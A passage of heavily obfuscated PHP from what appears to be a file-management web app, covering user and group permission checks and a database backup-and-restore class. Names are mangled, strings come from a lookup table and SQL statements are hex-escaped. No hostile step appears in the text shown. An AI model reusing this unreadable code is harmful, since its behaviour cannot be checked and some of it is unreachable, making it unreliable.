$¶áèöÊ‰[$¨¾Â¼‡[678]]); if ($¶áèöÊ‰[$¨¾Â¼‡[2197]]) { break; } } if (count($ÖñÊä“®) == 0) { $ÖñÊä“® = $this->authFolderOwnerGroup($ê‹éŞ[$¨¾Â¼‡[582]]); } $ÖñÊä“® = array_unique($ÖñÊä“®); if (AuthModel::authCheckRoot($ê‹éŞ[$¨¾Â¼‡[498]][$¨¾Â¼‡[499]])) { $ÖñÊä“®[] = USER_ID; } $ê‹éŞ[$¨¾Â¼‡[498]][$¨¾Â¼‡[2198]] = Model($¨¾Â¼‡[590])->userListInfo($ÖñÊä“®); return $ê‹éŞ; } private function authFolderOwnerGroup($Ê¬°§„ç) { $Ã£§‘» =& $_SERVER[äô®•½Â]; $¿ ğ´ = Model($Ã£§‘»[2072])->where(array($Ã£§‘»[1388] => $Ê¬°§„ç))->select(); $ÏşŠ¾»€ = array(); if (!$¿ ğ´) { return $ÏşŠ¾»€; } foreach ($¿ ğ´ as $Ïù—„§Ï) { $öİĞÀ…Ü = $this->authInfo($Ïù—„§Ï); if (AuthModel::authCheckRoot($öİĞÀ…Ü[$Ã£§‘»[498]])) { $ÏşŠ¾»€[] = $Ïù—„§Ï[$Ã£§‘»[1777]]; } } return $ÏşŠ¾»€; } private function authFolderOwnerUser($û¯ºõ÷†) { $„ú·‹ =& $_SERVER[äô®•½Â]; $¦”»î‚ = array(); $ÑÃÀ£Öö = !1; foreach ($û¯ºõ÷† as $³ˆ×…´–) { $¼±Ş‚‚ß = $this->authInfo($³ˆ×…´–); if ($³ˆ×…´–[$„ú·‹[582]] == $„ú·‹[231]) { $ÑÃÀ£Öö = !0; } if ($³ˆ×…´–[$„ú·‹[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¼±Ş‚‚ß[$„ú·‹[498]])) { $¦”»î‚[] = $³ˆ×…´–[$„ú·‹[582]]; } } } return array($„ú·‹[678] => $¦”»î‚, $„ú·‹[2197] => $ÑÃÀ£Öö); } public function authMake($Ç–ÑÀ’Í, $şÃúˆ’ = false) { $û€¾ˆ¯° =& $_SERVER[äô®•½Â]; $ˆËíßû = $this->authArrayCheck($Ç–ÑÀ’Í, $şÃúˆ’); if ($ˆËíßû[$û€¾ˆ¯°[2199]]) { $ˆËíßû[$û€¾ˆ¯°[2199]] = $this->sourceAuthInfo($ˆËíßû[$û€¾ˆ¯°[2199]]); } return $ˆËíßû; } public function authArrayCheck($Ş¦ÁŠ­Õ, $œæ¡ì³† = false) { $À¹­—ğ =& $_SERVER[äô®•½Â]; if (!$Ş¦ÁŠ­Õ) { return array($À¹­—ğ[499] => 0, $À¹­—ğ[553] => !1); } $œæ¡ì³† = $œæ¡ì³† ? $œæ¡ì³† : USER_ID; $ÕœÓ¼Àï = 0; $šãã˜ú¢ = 0; $©‰ŸŞ† = 0; $ß åœ‹º = 0; $ëöİû¥œ = 0; $ñêÑºÕÍ = 0; $ïßºËßÅ = 1000; $ªÖŒÏÅ = 0; $À²Á–À = 0; $½”ğˆû° = 0; $¨¼š‰êê = 0; $ƒà„½àà = array($À¹­—ğ[194] => 0); foreach ($Ş¦ÁŠ­Õ as $ƒà„½àà) { $úˆØ’¨Ü = $this->authInfo($ƒà„½àà); if (!$úˆØ’¨Ü) { continue; } $í¯â®† = $ƒà„½àà[$À¹­—ğ[582]]; $î·İßÁ¿ = intval($úˆØ’¨Ü[$À¹­—ğ[498]]); if ($ƒà„½àà[$À¹­—ğ[191]] == SourceModel::TYPE_USER && $í¯â®† == $œæ¡ì³†) { $ÕœÓ¼Àï = !0; $©‰ŸŞ† = $úˆØ’¨Ü; $šãã˜ú¢ = $î·İßÁ¿; } else { if ($ƒà„½àà[$À¹­—ğ[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($í¯â®†, $œæ¡ì³†)) { $ß åœ‹º = !0; $ë‡ŸÛ˜ö = $this->groupStepToUserGroup($í¯â®†, $œæ¡ì³†); if ($ë‡ŸÛ˜ö < $ïßºËßÅ) { $ïßºËßÅ = $ë‡ŸÛ˜ö; $ëöİû¥œ = $î·İßÁ¿; $ñêÑºÕÍ = $úˆØ’¨Ü; $ªÖŒÏÅ = $í¯â®†; } if ($ë‡ŸÛ˜ö == $ïßºËßÅ && $î·İßÁ¿ >= $ëöİû¥œ) { $ëöİû¥œ = $î·İßÁ¿; $ñêÑºÕÍ = $úˆØ’¨Ü; $ªÖŒÏÅ = $í¯â®†; } } else { if ($í¯â®† == $À¹­—ğ[231]) { $À²Á–À = !0; $¨¼š‰êê = $úˆØ’¨Ü; $½”ğˆû° = $î·İßÁ¿; } } } } if ($ÕœÓ¼Àï) { $Š§ĞìãÁ = $šãã˜ú¢; $úˆØ’¨Ü = $©‰ŸŞ†; $ÜïÔ¨Šé = LNG($À¹­—ğ[2200]); } else { if ($ß åœ‹º) { $Š§ĞìãÁ = $ëöİû¥œ; $úˆØ’¨Ü = $ñêÑºÕÍ; $ô”Éˆ“Ÿ = Model($À¹­—ğ[598])->getInfo($ªÖŒÏÅ); $ÜïÔ¨Šé = $À¹­—ğ[176] . $ô”Éˆ“Ÿ[$À¹­—ğ[602]] . $À¹­—ğ[2201] . LNG($À¹­—ğ[2202]); } else { if ($À²Á–À) { $Š§ĞìãÁ = $½”ğˆû°; $úˆØ’¨Ü = $¨¼š‰êê; $ÜïÔ¨Šé = LNG($À¹­—ğ[2173]); } else { $Š§ĞìãÁ = 0; $úˆØ’¨Ü = !1; $ÜïÔ¨Šé = $À¹­—ğ[12]; } } } $¨«‚÷§ = array($À¹­—ğ[2192] => intval($Š§ĞìãÁ), $À¹­—ğ[2175] => $úˆØ’¨Ü, $À¹­—ğ[2193] => $ÜïÔ¨Šé, $À¹­—ğ[2184] => $ƒà„½àà[$À¹­—ğ[194]]); return $¨«‚÷§; } private function groupContainUser($¡ä”ŒÜı, $Şè«Â¯Æ = false) { return in_array($¡ä”ŒÜı, $this->userGroupParents($Şè«Â¯Æ)); } private function groupStepToUserGroup($÷ÆÓú¿è, $ÄÊÒŠÙ¿ = false) { $ŞÈ¦Ò¾õ =& $_SERVER[äô®•½Â]; $¥Â›ß¨¶ = $this->userGroupList($ÄÊÒŠÙ¿); $Õâœ¿­ = 1000; $º›³Ò™ = $GLOBALS[$ŞÈ¦Ò¾õ[6]][$ŞÈ¦Ò¾õ[92]][$ŞÈ¦Ò¾õ[2085]] == 1; $ÊÀš‰¶ï = $º›³Ò™ ? 3 : 2; foreach ($¥Â›ß¨¶ as $é§‰¯Í–) { if ($é§‰¯Í–[$ŞÈ¦Ò¾õ[1388]] == $÷ÆÓú¿è) { return 0; } $è«íü¡À = explode($ŞÈ¦Ò¾õ[50], trim($é§‰¯Í–[$ŞÈ¦Ò¾õ[597]], $ŞÈ¦Ò¾õ[50])); if ($è«íü¡À[0] == $ŞÈ¦Ò¾õ[231] && count($è«íü¡À) > $ÊÀš‰¶ï) { $ÍÙ¾ = array_reverse(array_slice($è«íü¡À, $ÊÀš‰¶ï)); $‚÷Ë‡ú£ = array_search($÷ÆÓú¿è, $ÍÙ¾); if ($‚÷Ë‡ú£ !== !1 && $‚÷Ë‡ú£ + 1 <= $Õâœ¿­) { $Õâœ¿­ = $‚÷Ë‡ú£ + 1; } } } return $Õâœ¿­; } private function userGroupList($ÑŒ¡°Ã° = false) { $Ê¡¤×ÇÜ =& $_SERVER[äô®•½Â]; static $ëÛØ˜‘ø = array(); if (isset($ëÛØ˜‘ø[$ÑŒ¡°Ã°])) { return $ëÛØ˜‘ø[$ÑŒ¡°Ã°]; } $Ù„¶¢¡ = Model($Ê¡¤×ÇÜ[610])->getInfo($ÑŒ¡°Ã°); $ëÛØ˜‘ø[$ÑŒ¡°Ã°] = array_to_keyvalue($Ù„¶¢¡[$Ê¡¤×ÇÜ[1387]], $Ê¡¤×ÇÜ[1388]); return $ëÛØ˜‘ø[$ÑŒ¡°Ã°]; } public function userGroupParents($ñ¡®Ö´ö) { $¶†„û =& $_SERVER[äô®•½Â]; static $Š€İÓıí = array(); $ñ¡®Ö´ö = $ñ¡®Ö´ö ? $ñ¡®Ö´ö : USER_ID; if (isset($Š€İÓıí[$ñ¡®Ö´ö])) { return $Š€İÓıí[$ñ¡®Ö´ö]; } $öƒÓ×Ó = $this->userGroupList($ñ¡®Ö´ö); $º¸‰”şû = array(); $ë¼Ã¿ = $GLOBALS[$¶†„û[6]][$¶†„û[92]][$¶†„û[2085]] == 1; $»‘ª¿ = $ë¼Ã¿ ? 3 : 2; foreach ($öƒÓ×Ó as $‘ñ“ÕˆŞ) { $ÌşäÜõ = array($‘ñ“ÕˆŞ[$¶†„û[1388]]); $·»¼È¶¬ = explode($¶†„û[50], trim($‘ñ“ÕˆŞ[$¶†„û[597]], $¶†„û[50])); if ($·»¼È¶¬[0] == $¶†„û[231] && count($·»¼È¶¬) > $»‘ª¿) { $ªéêÜâ– = array_slice($·»¼È¶¬, $»‘ª¿); $ÌşäÜõ = array_merge($ÌşäÜõ, array_reverse($ªéêÜâ–)); } $º¸‰”şû = array_merge($º¸‰”şû, $ÌşäÜõ); } $Š€İÓıí[$ñ¡®Ö´ö] = array_unique($º¸‰”şû); return $Š€İÓıí[$ñ¡®Ö´ö]; } public function authTargetInfoMake($õïçóüØ) { $§„°œöñ =& $_SERVER[äô®•½Â]; $±ñ×íªÙ = array(); $ˆşæ®ã– = array(); foreach ($õïçóüØ as $«àÔÒ³) { if ($«àÔÒ³[$§„°œöñ[191]] == SourceModel::TYPE_USER) { $±ñ×íªÙ[] = intval($«àÔÒ³[$§„°œöñ[582]]); } else { if ($«àÔÒ³[$§„°œöñ[191]] == SourceModel::TYPE_GROUP) { $ˆşæ®ã–[] = intval($«àÔÒ³[$§„°œöñ[582]]); } } } if ($±ñ×íªÙ) { $±ñ×íªÙ = Model($§„°œöñ[590])->userListInfo($±ñ×íªÙ); } if ($ˆşæ®ã–) { $¾öşùñ¤ = array($§„°œöñ[2067] => array($§„°œöñ[503], $ˆşæ®ã–)); $ˆşæ®ã– = Model($§„°œöñ[598])->field($§„°œöñ[2203])->where($¾öşùñ¤)->select(); $ˆşæ®ã– = array_to_keyvalue($ˆşæ®ã–, $§„°œöñ[1388]); } return array($§„°œöñ[2204] => $±ñ×íªÙ, $§„°œöñ[2205] => $ˆşæ®ã–); } public function authInfo($ÏÒ™Æ«í) { $ôãÒ™Éú =& $_SERVER[äô®•½Â]; if ($ÏÒ™Æ«í[$ôãÒ™Éú[2086]]) { $ªÂ±ô¼ª = Model($ôãÒ™Éú[584])->listData($ÏÒ™Æ«í[$ôãÒ™Éú[2086]]); if (!$ªÂ±ô¼ª) { return !1; $œ²íëô = Model($ôãÒ™Éú[584])->listData(); $Õ§ÀÁ = array_filter_by_field($œ²íëô, $ôãÒ™Éú[498], $ôãÒ™Éú[231]); return $Õ§ÀÁ; } $ŠŸ¸²Ü = array_field_key($ªÂ±ô¼ª, array($ôãÒ™Éú[486], $ôãÒ™Éú[32], $ôãÒ™Éú[498], $ôãÒ™Éú[2000], $ôãÒ™Éú[2001])); $ŠŸ¸²Ü[$ôãÒ™Éú[2206]] = $ÏÒ™Æ«í; return $ŠŸ¸²Ü; } else { return array($ôãÒ™Éú[504] => 0, $ôãÒ™Éú[1983] => $ÏÒ™Æ«í[$ôãÒ™Éú[2149]], $ôãÒ™Éú[505] => $ôãÒ™Éú[12], $ôãÒ™Éú[2000] => $ôãÒ™Éú[2207]); } } } goto c¡“Ö²©Ë™; AãŠ“àÑ›é: class DbManage { function __construct($©±ñÑÅÁ = array()) { $ÛÊ®ÏÕ‹ =& $_SERVER[äô®•½Â]; if (empty($©±ñÑÅÁ)) { $©±ñÑÅÁ = $GLOBALS[$ÛÊ®ÏÕ‹[6]][$ÛÊ®ÏÕ‹[21]]; } $this->database = $©±ñÑÅÁ; } public function model($­‹²£‚” = '') { return new ModelBase($­‹²£‚”, $_SERVER[äô®•½Â][12], $this->database); } public function db($Àõ§Àù = false) { $”Ôİ“Ü =& $_SERVER[äô®•½Â]; $ƒ÷“©£ñ = array_change_key_case($this->database); if ($this->dbType() == $”Ôİ“Ü[13] || !$Àõ§Àù) { return $this->model()->db(); } $îõÙ™–ˆ = $ƒ÷“©£ñ[$”Ôİ“Ü[1044]]; $ƒ÷“©£ñ[$”Ôİ“Ü[1044]] = $”Ôİ“Ü[12]; if ($ƒ÷“©£ñ[$”Ôİ“Ü[1039]] == $”Ôİ“Ü[1036]) { $²ÉÜ¸Ó€ = $ƒ÷“©£ñ[$”Ôİ“Ü[1045]]; $ƒ÷“©£ñ[$”Ôİ“Ü[1045]] = substr($²ÉÜ¸Ó€, 0, strrpos($²ÉÜ¸Ó€, $”Ôİ“Ü[1131])); } $this->database = $ƒ÷“©£ñ; $Àë¥ÆÊ‰ = $this->model()->db(); try { $ùç¿é›Ñ = $Àë¥ÆÊ‰->execute("\x73\150\157\x77\40\144\141\164\141\142\x61\163\145\163\40\154\x69\x6b\x65\40\x27{$îõÙ™–ˆ}\x27"); } catch (Exception $ÍÓŒ·¿à) { } if (!$ùç¿é›Ñ) { $Àë¥ÆÊ‰->execute("\x63\x72\x65\141\x74\x65\40\144\141\x74\141\x62\141\163\x65\x20\x60{$îõÙ™–ˆ}\140"); } $ƒ÷“©£ñ[$”Ôİ“Ü[1044]] = $îõÙ™–ˆ; if ($ƒ÷“©£ñ[$”Ôİ“Ü[1039]] == $”Ôİ“Ü[1036]) { $ƒ÷“©£ñ[$”Ôİ“Ü[1045]] .= $”Ôİ“Ü[1131] . $îõÙ™–ˆ; } $this->database = $ƒ÷“©£ñ; $Àë¥ÆÊ‰->execute("\165\x73\145\x20\140{$îõÙ™–ˆ}\x60"); return $Àë¥ÆÊ‰; } public function createTable($¬Ç¹Ìóö, &$ŞÍ„÷Ùï) { $Õ½üóİ =& $_SERVER[äô®•½Â]; if (!IO::exist($¬Ç¹Ìóö)) { ActionCall($Õ½üóİ[1132], !0, 0); show_json(LNG($Õ½üóİ[1133]), !1); } $ıñ‹¬ÍŒ = $this->model()->db(); $€øÕÍÅ = sqlSplit(IO::getContent($¬Ç¹Ìóö)); foreach ($€øÕÍÅ as $Óû‰æ¨Á) { $ôœÙÙãŒ = stripos($Óû‰æ¨Á, $Õ½üóİ[1134]) === 0; if ($ôœÙÙãŒ) { $ŞÍ„÷Ùï->task[$Õ½üóİ[1135]] += 1; } $ıñ‹¬ÍŒ->execute($Óû‰æ¨Á); if ($ôœÙÙãŒ) { preg_match($Õ½üóİ[1136], $Óû‰æ¨Á, $±Æ¤ÇıŸ); $ŞÍ„÷Ùï->task[$Õ½üóİ[1137]] = $±Æ¤ÇıŸ[1]; $ŞÍ„÷Ùï->update(1); } } } public function insertTable($ï£ŞÅº¿, &$áá´åûÙ) { $ê“òô’ =& $_SERVER[äô®•½Â]; $»üÌîÃ = $this->model()->db(); $™…„š = $À©ªŞˆ˜ ? array($À©ªŞˆ˜) : $»üÌîÃ->getTables(); foreach ($ï£ŞÅº¿ as $Ñ°âµú) { $À©ªŞˆ˜ = basename($Ñ°âµú, $ê“òô’[856]); if (!in_array($À©ªŞˆ˜, $™…„š)) { continue; } $áá´åûÙ->task[$ê“òô’[1137]] = $À©ªŞˆ˜; if (get_filesize($Ñ°âµú) == 0) { continue; } $×…Æòú = $this->sqlToDb($Ñ°âµú, $áá´åûÙ); if (!$×…Æòú) { ActionCall($ê“òô’[1132], !0, 0); show_json(LNG($ê“òô’[1138]) . "\x5b{$À©ªŞˆ˜}\x5d", !1); } } } public function sqlFromDb($˜€’ê», $££»Œ”‚, &$Îİ’ÉƒÚ, $¯ÙÓû™Ù = '') { if ($Îİ’ÉƒÚ) { $Îİ’ÉƒÚ->task[$_SERVER[äô®•½Â][1137]] = $˜€’ê»; } $˜óå–Ö = $this->model($˜€’ê»); $±âÓÓÉ¥ = 0; $ıÁÔ‚ œ = 0; $·‚—„‚Õ = 10000; $€ì™²«Ú = fopen($££»Œ”‚, $_SERVER[äô®•½Â][1139]); $µ›Š šË = $˜óå–Ö->getPk(); $ÖÄŞŠã‡ = $˜óå–Ö->getDbFields(); $êªˆŒë† = $_SERVER[äô®•½Â][12]; if ($GLOBALS[$_SERVER[äô®•½Â][855]] && in_array($˜€’ê», array($_SERVER[äô®•½Â][1140], $_SERVER[äô®•½Â][1141]))) { $êªˆŒë† = $˜€’ê»; } do { $çÂ€›Úé = array($µ›Š šË => array($_SERVER[äô®•½Â][1086], $ıÁÔ‚ œ)); $Å«‡É½¿ = $˜óå–Ö->where($çÂ€›Úé)->field($ÖÄŞŠã‡)->order($µ›Š šË . $_SERVER[äô®•½Â][1142])->limit($·‚—„‚Õ)->select(); $Å«‡É½¿ = !empty($Å«‡É½¿) ? $Å«‡É½¿ : array(); if (!($ŸœÙÊõÙ = count($Å«‡É½¿))) { break; } $æ±ü¾„Ø = end($Å«‡É½¿); $ıÁÔ‚ œ = $æ±ü¾„Ø[$µ›Š šË]; $æó­Š…› = array(); foreach ($Å«‡É½¿ as $Ø—™¬çû) { if ($êªˆŒë†) { if ($˜€’ê» == $_SERVER[äô®•½Â][1140]) { if ($Ø—™¬çû[$_SERVER[äô®•½Â][33]] == $_SERVER[äô®•½Â][1143]) { $ıĞ’öä = json_decode($Ø—™¬çû[$_SERVER[äô®•½Â][461]], !0); if ($ıĞ’öä[$_SERVER[äô®•½Â][32]] == $GLOBALS[$_SERVER[äô®•½Â][855]] && $ıĞ’öä[$_SERVER[äô®•½Â][815]] != 1) { continue; } } } else { if ($Ø—™¬çû[$_SERVER[äô®•½Â][33]] == $_SERVER[äô®•½Â][1144] && $Ø—™¬çû[$_SERVER[äô®•½Â][97]] == $_SERVER[äô®•½Â][851]) { continue; } } } if ($¯ÙÓû™Ù) { $Ø—™¬çû[$_SERVER[äô®•½Â][87]] = "\x7b\x69\x6f\72{$¯ÙÓû™Ù}\175" . substr($Ø—™¬çû[$_SERVER[äô®•½Â][87]], strlen("\x7b\151\157\72{$Ø—™¬çû[$_SERVER[äô®•½Â][889]]}\175")); $Ø—™¬çû[$_SERVER[äô®•½Â][889]] = $¯ÙÓû™Ù; } $æó­Š…›[] = $_SERVER[äô®•½Â][1145] . $this->sqlEncode($Ø—™¬çû) . $_SERVER[äô®•½Â][1146]; } $áá°Äß– = "\x49\116\123\x45\x52\x54\40\x49\x4e\124\117\x20\140{$˜€’ê»}\x60\x20\x28\x60" . implode($_SERVER[äô®•½Â][1147], $ÖÄŞŠã‡) . $_SERVER[äô®•½Â][1148]; fwrite($€ì™²«Ú, $áá°Äß– . implode($_SERVER[äô®•½Â][1149], $æó­Š…›) . $_SERVER[äô®•½Â][74] . PHP_EOL); $±âÓÓÉ¥ += $ŸœÙÊõÙ; if ($Îİ’ÉƒÚ) { $Îİ’ÉƒÚ->update($ŸœÙÊõÙ); } } while ($·‚—„‚Õ == $ŸœÙÊõÙ); fclose($€ì™²«Ú); return $±âÓÓÉ¥; } public function sqlToDb($£‹–Æ°—, &$¼ùÂ«ë) { $­Š—¼µ­ =& $_SERVER[äô®•½Â]; $’³²¥· = $this->model()->db(); $ê’¼¯¤˜ = @fopen($£‹–Æ°—, $­Š—¼µ­[1150]); if (!$ê’¼¯¤˜) { return !1; } $´“ı•Ÿ¹ = 0; $ËÉ¬¨¯‘ = $­Š—¼µ­[12]; $ˆ‰ºÄ¾© = array(); $‘Šã£Î„ = $this->dbType(); $á†åûñ— = $‘Šã£Î„ == $­Š—¼µ­[13] ? 500 : 2000; $Ñ÷âÙ = basename($£‹–Æ°—, $­Š—¼µ­[856]); $ë³Šê‹  = 0; $âè†Ñú = 4194304; while (!feof($ê’¼¯¤˜)) { $ó’”°ãü = trim(fgets($ê’¼¯¤˜)); if (!$ó’”°ãü) { continue; } $¢ş…àØ¥ = $this->sqlDecode($ó’”°ãü, $‘Šã£Î„, $Ñ÷âÙ); if (stripos($¢ş…àØ¥, $­Š—¼µ­[441]) === 0) { if (!$ËÉ¬¨¯‘) { $ËÉ¬¨¯‘ = $¢ş…àØ¥ . $­Š—¼µ­[53]; } continue; } if ($¼ùÂ«ë) { $¼ùÂ«ë->task[$­Š—¼µ­[1135]] += 1; } $´“ı•Ÿ¹++; $ˆ‰ºÄ¾©[] = rtrim(rtrim(trim($¢ş…àØ¥), $­Š—¼µ­[50]), $­Š—¼µ­[74]); $•ìêØÚ = null; $¶±«æ“™ = strlen($¢ş…àØ¥); $ë³Šê‹  += $¶±«æ“™; $¥¥‹´µ¼ = strlen($ËÉ¬¨¯‘) + $ë³Šê‹  + (count($ˆ‰ºÄ¾©) - 1); if ($¥¥‹´µ¼ >= $âè†Ñú) { $•ìêØÚ = array_pop($ˆ‰ºÄ¾©); if ($´“ı•Ÿ¹ > 1) { $´“ı•Ÿ¹--; } } if ($´“ı•Ÿ¹ >= $á†åûñ— || $•ìêØÚ) { $¢ş…àØ¥ = $ËÉ¬¨¯‘ . implode($­Š—¼µ­[50], $ˆ‰ºÄ¾©); if (!$’³²¥·->execute($¢ş…àØ¥)) { return !1; } if ($¼ùÂ«ë) { $¼ùÂ«ë->update($´“ı•Ÿ¹); } $ˆ‰ºÄ¾© = array(); $´“ı•Ÿ¹ = 0; $ë³Šê‹  = 0; if ($•ìêØÚ) { $ˆ‰ºÄ¾© = array($•ìêØÚ); $´“ı•Ÿ¹ = 1; $ë³Šê‹  = $¶±«æ“™; } } } fclose($ê’¼¯¤˜); if (!empty($ˆ‰ºÄ¾©)) { $¢ş…àØ¥ = $ËÉ¬¨¯‘ . implode($­Š—¼µ­[50], $ˆ‰ºÄ¾©); if (!$’³²¥·->execute($¢ş…àØ¥)) { return !1; } if ($¼ùÂ«ë) { $¼ùÂ«ë->update($´“ı•Ÿ¹); } } return !0; } public function dropTable($¯êÈîï— = null) { $ç†áş×ë = $this->model()->db(); $óû©º¦² = $¯êÈîï— ? array($¯êÈîï—) : $ç†áş×ë->getTables(); if (!$óû©º¦²) { return; } foreach ($óû©º¦² as $¯êÈîï—) { if ($¯êÈîï—) { $¯êÈîï— = strtolower($¯êÈîï—); } else { continue; } $ç†áş×ë->execute("\x64\x72\x6f\x70\40\164\x61\x62\154\145\x20\x69\146\40\x65\x78\151\163\x74\x73\x20\140{$¯êÈîï—}\140"); } } private function sqlEncode($×ÓÍïÀÊ) { $š¨®Ëãõ =& $_SERVER[äô®•½Â]; $¥õœÁï = array(); foreach ($×ÓÍïÀÊ as $ˆÎÀãÌ) { if (is_array($ˆÎÀãÌ)) { $ˆÎÀãÌ = json_encode_force($ˆÎÀãÌ); } $ˆÎÀãÌ = addslashes($ˆÎÀãÌ); $ˆÎÀãÌ = str_replace(array($š¨®Ëãõ[1151], $š¨®Ëãõ[288], $š¨®Ëãõ[428]), array($š¨®Ëãõ[1152], $š¨®Ëãõ[1153], $š¨®Ëãõ[1154]), $ˆÎÀãÌ); $¥õœÁï[] = $ˆÎÀãÌ; } return $š¨®Ëãõ[58] . implode($š¨®Ëãõ[1155], $¥õœÁï) . $š¨®Ëãõ[58]; } private function sqlDecode($ËôÍ’Ûó, $œ™ºÆ“, $š‹´¸¶Á = '') { $Ï¹¸ôËô =& $_SERVER[äô®•½Â]; $ËôÍ’Ûó = str_replace(array($Ï¹¸ôËô[1152], $Ï¹¸ôËô[1153], $Ï¹¸ôËô[1154]), array($Ï¹¸ôËô[1151], $Ï¹¸ôËô[288], $Ï¹¸ôËô[428]), $ËôÍ’Ûó); if ($œ™ºÆ“ == $Ï¹¸ôËô[13]) { $ËôÍ’Ûó = str_ireplace($Ï¹¸ôËô[1156], $Ï¹¸ôËô[59], $ËôÍ’Ûó); $ËôÍ’Ûó = stripslashes($ËôÍ’Ûó); } return preg_replace($Ï¹¸ôËô[1157], $Ï¹¸ôËô[12], $ËôÍ’Ûó); if ($œ™ºÆ“ == $Ï¹¸ôËô[13]) { return $š‹´¸¶Á != $Ï¹¸ôËô[850] ? stripslashes($ËôÍ’Ûó) : $ËôÍ’Ûó; } if ($š‹´¸¶Á == $Ï¹¸ôËô[850]) { $ËôÍ’Ûó = str_replace($Ï¹¸ôËô[1158], $Ï¹¸ôËô[121], stripslashes($ËôÍ’Ûó)); } return $ËôÍ’Ûó; } public function getSqlFile($¼û¨Øù = '') { $ĞüÓ›·ç =& $_SERVER[äô®•½Â]; $ã¬‡»ù¯ = $this->dbType(!0); $ıİéæ‰Ò = CONTROLLER_DIR . "\x69\x6e\x73\x74\x61\x6c\x6c\57\x64\141\x74\x61\57{$ã¬‡»ù¯}\x2e\163\161\154"; if (!file_exists($ıİéæ‰Ò)) { return !1; } $ŞÅá…àî = file_get_contents($ıİéæ‰Ò); $ü’â‘Ó« = $ĞüÓ›·ç[1159] . ($ã¬‡»ù¯ == $ĞüÓ›·ç[874] ? $ĞüÓ›·ç[1160] : $ĞüÓ›·ç[1161]) . $ĞüÓ›·ç[1162]; preg_match_all($ü’â‘Ó«, $ŞÅá…àî, $³ŸÜé½´); $ıÀÉö› = $³ŸÜé½´[1]; $²šÒ = $this->model()->db(); $˜ò‡½­ß = $²šÒ->getTables(); $Ø€³œ©„ = TEMP_FILES . $ĞüÓ›·ç[1163] . date($ĞüÓ›·ç[262]) . $ĞüÓ›·ç[8]; del_dir($Ø€³œ©„); mk_dir($Ø€³œ©„); $óÌÇ¢¢á = $Ø€³œ©„ . $ĞüÓ›·ç[1164]; $ŞÉÂ–•¯ = $Ø€³œ©„ . $ĞüÓ›·ç[1165]; $²“øá‹« = $ã¬‡»ù¯ == $ĞüÓ›·ç[13] ? $ĞüÓ›·ç[874] : $ĞüÓ›·ç[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\163\x74\x61\x6c\154\x2f\x64\x61\x74\x61\x2f{$²“øá‹«}\56\x73\x71\154", $Ø€³œ©„); @touch($Ø€³œ©„ . $ã¬‡»ù¯ . $ĞüÓ›·ç[856]); $äúîòÍ“ = fopen($óÌÇ¢¢á, $ĞüÓ›·ç[1139]); $ó…Ä÷‡ = fopen($ŞÉÂ–•¯, $ĞüÓ›·ç[1139]); if ($ã¬‡»ù¯ == $ĞüÓ›·ç[13]) { $˜ò‡½­ß = array_diff($˜ò‡½­ß, array($ĞüÓ›·ç[848], $ĞüÓ›·ç[849])); $©€©øù = array($ĞüÓ›·ç[1166], $ĞüÓ›·ç[1167], $ĞüÓ›·ç[1168]); fwrite($ó…Ä÷‡, implode(PHP_EOL, $©€©øù) . PHP_EOL . PHP_EOL); foreach ($˜ò‡½­ß as $îå¬ùı) { $¤¤Û›Ö· = $this->sqlFromSqlite($îå¬ùı); if (!$¤¤Û›Ö·[$ĞüÓ›·ç[13]]) { continue; } fwrite($ó…Ä÷‡, $¤¤Û›Ö·[$ĞüÓ›·ç[13]] . PHP_EOL . PHP_EOL); if (!in_array($îå¬ùı, $ıÀÉö›)) { fwrite($äúîòÍ“, $¤¤Û›Ö·[$ĞüÓ›·ç[874]] . PHP_EOL . PHP_EOL); } } } else { foreach ($˜ò‡½­ß as $îå¬ùı) { $¤¤Û›Ö· = $this->sqlFromMysql($îå¬ùı); if (!$¤¤Û›Ö·[$ĞüÓ›·ç[874]]) { continue; } fwrite($äúîòÍ“, $¤¤Û›Ö·[$ĞüÓ›·ç[874]] . PHP_EOL . PHP_EOL); if (!in_array($îå¬ùı, $ıÀÉö›)) { fwrite($ó…Ä÷‡, $¤¤Û›Ö·[$ĞüÓ›·ç[13]] . PHP_EOL . PHP_EOL); } } } fclose($äúîòÍ“); fclose($ó…Ä÷‡); $ŞÅá…àî = array($ĞüÓ›·ç[874] => $óÌÇ¢¢á, $ĞüÓ›·ç[13] => $ŞÉÂ–•¯); return $¼û¨Øù ? $ŞÅá…àî[$¼û¨Øù] : $ŞÅá…àî; } public function dbType($ï÷õİİƒ = false) { $õ‡É’Éœ =& $_SERVER[äô®•½Â]; $×ñô°Ÿ‡ = $ï÷õİİƒ ? $GLOBALS[$õ‡É’Éœ[6]][$õ‡É’Éœ[21]] : $this->database; $×ñô°Ÿ‡ = array_change_key_case($×ñô°Ÿ‡); $Í«Œ«³Ö = $×ñô°Ÿ‡[$õ‡É’Éœ[1039]]; if ($Í«Œ«³Ö == $õ‡É’Éœ[1036]) { $°ÂÕïî‚ = explode($õ‡É’Éœ[4], $×ñô°Ÿ‡[$õ‡É’Éœ[1045]]); $Í«Œ«³Ö = $°ÂÕïî‚[0]; } $‚ŞÌ´›ù = array($õ‡É’Éœ[1169] => $õ‡É’Éœ[13], $õ‡É’Éœ[984] => $õ‡É’Éœ[874]); if (isset($‚ŞÌ´›ù[$Í«Œ«³Ö])) { $Í«Œ«³Ö = $‚ŞÌ´›ù[$Í«Œ«³Ö]; } return $Í«Œ«³Ö; } public function sqlFromMysql($²ä¡’Ø°, $±¼ôÕº = '') { $æÚöåÂ =& $_SERVER[äô®•½Â]; $İÍ—Œ³  = $this->model()->db(); $ï ³êçÓ = $İÍ—Œ³ ->query($æÚöåÂ[1170] . $²ä¡’Ø° . $æÚöåÂ[472]); if (!$ï ³êçÓ || !$ï ³êçÓ[0]) { return !1; } $Âª¤½† = _get($ï ³êçÓ[0], $æÚöåÂ[1171], $æÚöåÂ[12]); if (!$Âª¤½†) { return !1; } $õ¬–óĞ = "\x44\x52\x4f\120\40\124\x41\x42\114\x45\x20\x49\x46\40\x45\130\111\x53\124\123\x20\x60{$²ä¡’Ø°}\x60\x3b" . PHP_EOL . $Âª¤½† . $æÚöåÂ[74]; if ($±¼ôÕº && $±¼ôÕº == $æÚöåÂ[874]) { return $õ¬–óĞ; } $Óûº¸ù÷ = array_change_key_case($GLOBALS[$æÚöåÂ[6]][$æÚöåÂ[21]]); $ä»Ôİ¨ = $Óûº¸ù÷[$æÚöåÂ[1044]]; $å‡ÃĞ®œ = $æÚöåÂ[1172] . $ä»Ôİ¨ . 